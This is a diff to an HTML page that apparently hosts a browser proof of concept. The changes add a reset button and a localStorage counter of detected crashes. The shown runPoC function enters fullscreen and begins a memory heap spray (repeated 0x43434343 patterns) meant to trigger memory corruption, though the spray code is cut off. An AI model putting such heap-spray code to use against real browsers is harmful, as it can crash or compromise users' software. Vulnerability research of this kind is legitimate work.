@@ -129,6 +129,20 @@ body {
   box-shadow: 0 0 30px rgba(0,0,0,0.7);
   display: none;
 }
+
+#resetBtn {
+  position: fixed;
+  bottom: 10px;
+  left: 10px;
+  background: #111;
+  color: #0f0;
+  border: 1px solid #0f0;
+  padding: 6px 10px;
+  font-family: monospace;
+  font-size: 14px;
+  cursor: pointer;
+  z-index: 10000;
+}
 </style>
 </head>
 <body>
@@ -152,23 +166,33 @@ body {
   </div>
 </div>
 
+<button id="resetBtn" onclick="resetCrashCount()">Reset counter</button>
+
 <script>
 window.onload = () => {
-  setTimeout(() => {
-    if (localStorage.getItem("wasAboutToCrash") === "yes") {
-      localStorage.removeItem("wasAboutToCrash");
-      alert("⚠️ Last run may have triggered instability or crash.");
-    }
-  }, 10000);
+  if (localStorage.getItem("wasAboutToCrash") === "yes") {
+    localStorage.removeItem("wasAboutToCrash");
+
+    let count = parseInt(localStorage.getItem("memoryCrashCount") || "0", 10);
+    count++;
+    localStorage.setItem("memoryCrashCount", count);
+
+    alert("✔ Memory corruption detected\nThis has happened " + count + " time(s).");
+  }
 };
+
+function resetCrashCount() {
+  localStorage.removeItem("memoryCrashCount");
+  alert("Memory corruption counter reset.");
+}
 
 function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  localStorage.setItem("wasAboutToCrash", "yes");
-
   document.body.requestFullscreen().then(() => {
+    localStorage.setItem("wasAboutToCrash", "yes");
+
     const PATTERN   = 0x43434343;
     const SPRAY_CNT = 100000;
     const SPRAY_LEN = 16;
